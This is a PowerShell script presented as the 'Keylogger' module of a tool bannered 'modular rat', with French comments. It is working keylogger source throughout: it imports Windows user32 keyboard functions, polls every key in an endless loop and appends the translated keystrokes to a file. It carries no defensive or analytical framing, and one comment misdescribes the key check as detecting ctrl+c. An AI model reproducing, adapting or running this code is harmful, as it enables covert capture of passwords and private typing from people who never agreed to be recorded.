function title {
    Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
    Write-Host "
     _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
    | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
    | | | | | | (_) | (_| | |_| | | (_| | |    | | | (_| | |_
    |_| |_| |_|\___/ \__,_|\__,_|_|\__,_|_|    |_|  \__,_|\__|
    " -ForegroundColor Yellow
    Write-Host "
                        Module : Keylogger
    " -ForegroundColor Blue
    Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
    Write-Host ""
}


#requires -Version 2
function Start-KeyLogger($file_name) {

    begin {
        $path = "$(Get-Location)\$file_name"

        # Signatures for API Calls
        $signatures = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@

        # load signatures and make members available
        $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
        # create output file
        New-Item -Path $path -ItemType File -Force

        Write-Host ""
        Write-Host "Starting keylogger..." -ForegroundColor Yellow
    }
    process {
        while ($true) {
            Start-Sleep -Milliseconds 40
      
            for ($ascii = 0; $ascii -le 254; $ascii++) {
                # Récupérer l'état de la clé courante
                $state = $API::GetAsyncKeyState($ascii)

                # Regarder si la ctrl + c est pressé
                if ($state -eq -32767) {
                    # traduire le code scané
                    $virtualKey = $API::MapVirtualKey($ascii, 3)

                    # récupérer l'état du keyboard
                    $kbstate = New-Object Byte[] 256
                    
                    # Préparer un String Builder
                    $mychar = New-Object -TypeName System.Text.StringBuilder

                    # traduction
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                    if ($success) {
                        # ajouter les touches enregistrées dans le fichier
                        [System.IO.File]::AppendAllText($path, $mychar, [System.Text.Encoding]::Unicode) 
                    }
                }
            }
        }
    }
}

function run($arg) {
    title
    If ($arg) {
        Start-KeyLogger($arg)
    }
    else { Write-Error "Please specify the file name..." }
}

run($args[0])